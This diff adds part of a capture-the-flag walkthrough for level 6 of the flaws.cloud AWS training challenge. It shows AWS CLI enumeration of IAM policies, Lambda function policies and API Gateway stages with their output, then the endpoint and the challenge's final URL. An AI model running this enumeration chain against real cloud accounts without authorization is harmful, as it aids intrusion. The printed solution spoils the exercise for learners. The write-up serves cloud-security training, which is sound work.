@@ -658,10 +658,163 @@ An error occurred (AccessDenied) when calling the ListObjectsV2 operation: Acces
 ![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/a8e29fc7-a56d-4540-805f-05664195878c)
 
 
+```
+┌─[✗]─[cwl@RedCloud]─[~/Desktop]
+└──╼ $aws iam get-user --profile level6
+{
+    "User": {
+        "Path": "/",
+        "UserName": "Level6",
+        "UserId": "AIDAIRMDOSCWGLCDWOG6A",
+        "Arn": "arn:aws:iam::975426262029:user/Level6",
+        "CreateDate": "2017-02-26T23:11:16Z"
+    }
+}
+┌─[cwl@RedCloud]─[~/Desktop]
+└──╼ $aws iam list-attached-user-policies --user-name Level6 --profile level6
+{
+    "AttachedPolicies": [
+        {
+            "PolicyName": "MySecurityAudit",
+            "PolicyArn": "arn:aws:iam::975426262029:policy/MySecurityAudit"
+        },
+        {
+            "PolicyName": "list_apigateways",
+            "PolicyArn": "arn:aws:iam::975426262029:policy/list_apigateways"
+        }
+    ]
+}
+```
 
+![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/273da8e2-1c69-4fbc-802d-b859de1b0164)
 
+```
+┌─[cwl@RedCloud]─[~/Desktop]
+└──╼ $aws iam get-policy --policy-arn arn:aws:iam::975426262029:policy/list_apigateways --profile level6
+{
+    "Policy": {
+        "PolicyName": "list_apigateways",
+        "PolicyId": "ANPAIRLWTQMGKCSPGTAIO",
+        "Arn": "arn:aws:iam::975426262029:policy/list_apigateways",
+        "Path": "/",
+        "DefaultVersionId": "v4",
+        "AttachmentCount": 1,
+        "PermissionsBoundaryUsageCount": 0,
+        "IsAttachable": true,
+        "Description": "List apigateways",
+        "CreateDate": "2017-02-20T01:45:17Z",
+        "UpdateDate": "2017-02-20T01:48:17Z",
+        "Tags": []
+    }
+}
+```
 
+![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/c9210184-3d34-46d3-bb3c-94ef53c15dea)
 
+```
+┌─[cwl@RedCloud]─[~/Desktop]
+└──╼ $aws iam get-policy-version --policy-arn arn:aws:iam::975426262029:policy/list_apigateways --version-id v4 --profile level6
+{
+    "PolicyVersion": {
+        "Document": {
+            "Version": "2012-10-17",
+            "Statement": [
+                {
+                    "Action": [
+                        "apigateway:GET"
+                    ],
+                    "Effect": "Allow",
+                    "Resource": "arn:aws:apigateway:us-west-2::/restapis/*"
+                }
+            ]
+        },
+        "VersionId": "v4",
+        "IsDefaultVersion": true,
+        "CreateDate": "2017-02-20T01:48:17Z"
+    }
+}
+```
 
+![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/e23d8277-782c-461c-bb64-5836209bc78d)
 
+```
+┌─[cwl@RedCloud]─[~/Desktop]
+└──╼ $aws lambda list-functions --region us-west-2 --profile level6
+{
+    "Functions": [
+        {
+            "FunctionName": "Level6",
+            "FunctionArn": "arn:aws:lambda:us-west-2:975426262029:function:Level6",
+            "Runtime": "python2.7",
+            "Role": "arn:aws:iam::975426262029:role/service-role/Level6",
+            "Handler": "lambda_function.lambda_handler",
+            "CodeSize": 282,
+            "Description": "A starter AWS Lambda function.",
+            "Timeout": 3,
+            "MemorySize": 128,
+            "LastModified": "2017-02-27T00:24:36.054+0000",
+            "CodeSha256": "2iEjBytFbH91PXEMO5R/B9DqOgZ7OG/lqoBNZh5JyFw=",
+            "Version": "$LATEST",
+            "TracingConfig": {
+                "Mode": "PassThrough"
+            },
+            "RevisionId": "d45cc6d9-f172-4634-8d19-39a20951d979",
+            "PackageType": "Zip",
+            "Architectures": [
+                "x86_64"
+            ],
+            "EphemeralStorage": {
+                "Size": 512
+            },
+            "SnapStart": {
+                "ApplyOn": "None",
+                "OptimizationStatus": "Off"
+            }
+        }
+    ]
+}
+```
 
+![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/67d107f5-1fc8-440a-9073-f7524212c261)
+
+```
+┌─[cwl@RedCloud]─[~/Desktop]
+└──╼ $aws lambda get-policy --function-name Level6 --region us-west-2 --profile level6
+{
+    "Policy": "{\"Version\":\"2012-10-17\",\"Id\":\"default\",\"Statement\":[{\"Sid\":\"904610a93f593b76ad66ed6ed82c0a8b\",\"Effect\":\"Allow\",\"Principal\":{\"Service\":\"apigateway.amazonaws.com\"},\"Action\":\"lambda:InvokeFunction\",\"Resource\":\"arn:aws:lambda:us-west-2:975426262029:function:Level6\",\"Condition\":{\"ArnLike\":{\"AWS:SourceArn\":\"arn:aws:execute-api:us-west-2:975426262029:s33ppypa75/*/GET/level6\"}}}]}",
+    "RevisionId": "d45cc6d9-f172-4634-8d19-39a20951d979"
+}
+```
+
+![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/444de92d-8376-451a-8ddd-ccd4ef36d953)
+
+```
+┌─[cwl@RedCloud]─[~/Desktop]
+└──╼ $aws apigateway get-stages --rest-api-id "s33ppypa75" --region us-west-2 --profile level6
+{
+    "item": [
+        {
+            "deploymentId": "8gppiv",
+            "stageName": "Prod",
+            "cacheClusterEnabled": false,
+            "cacheClusterStatus": "NOT_AVAILABLE",
+            "methodSettings": {},
+            "tracingEnabled": false,
+            "createdDate": 1488155168,
+            "lastUpdatedDate": 1488155168
+        }
+    ]
+}
+```
+
+![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/64fa96c2-0370-42be-8d18-ff40ad1dfda1)
+
+General format is: `https://<rest-api-id>.execute-api.<region>.amazonaws.com/<stage-name>/<lambda function>`
+
+Access the endpoint: https://s33ppypa75.execute-api.us-west-2.amazonaws.com/Prod/level6
+
+![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/cf794419-78ff-4e13-8ef9-bfc12bc35d84)
+
+Go to: http://theend-797237e8ada164bf9f12cebf93b282cf.flaws.cloud/d730aa2b/
+
+![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/96c35b89-223c-45f3-a911-2e5846203120)
